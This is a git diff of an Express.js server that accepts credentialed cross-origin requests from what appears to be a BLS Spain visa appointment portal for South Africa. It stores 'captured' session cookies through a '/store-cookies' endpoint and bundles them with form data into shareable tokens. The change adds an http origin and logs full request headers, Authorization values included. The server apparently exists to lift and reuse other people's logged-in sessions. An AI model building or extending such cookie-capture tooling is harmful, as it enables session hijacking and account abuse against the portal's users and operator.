@@ -7,10 +7,10 @@ const port = process.env.PORT || 3000; // Use port 3000 for Render
 
 // Enable CORS for specific origin
 app.use(cors({
-    origin: 'https://southafrica.blsspainglobal.com', // Allow requests from this domain
-    methods: ['GET', 'POST', 'OPTIONS'], // Allow these HTTP methods
-    credentials: true, // Allow cookies and credentials
-    allowedHeaders: ['Content-Type', 'Authorization'], // Allow these headers
+    origin: ['http://southafrica.blsspainglobal.com', 'https://southafrica.blsspainglobal.com'],
+    methods: ['GET', 'POST', 'OPTIONS'],
+    credentials: true,
+    allowedHeaders: ['Content-Type', 'Authorization'],
 }));
 
 // Middleware to parse URL-encoded and JSON data
@@ -43,7 +43,11 @@ app.post('/store-cookies', (req, res) => {
 
 // Endpoint to generate a shareable token
 app.post('/generate-token', (req, res) => {
-    console.log('Received request at /generate-token:', req.body); // Log the request body
+    console.log('Received request at /generate-token:', {
+        url: req.body.url,
+        formData: req.body.formData,
+        headers: req.headers,
+    });
 
     const { url, formData } = req.body;
 
@@ -55,7 +59,7 @@ app.post('/generate-token', (req, res) => {
 
     // Use stored cookies if available
     const cookies = capturedCookies || 'No cookies captured';
-    console.log('Using cookies:', cookies); // Log the cookies being used
+    console.log('Using cookies:', cookies);
 
     const sessionData = {
         url,
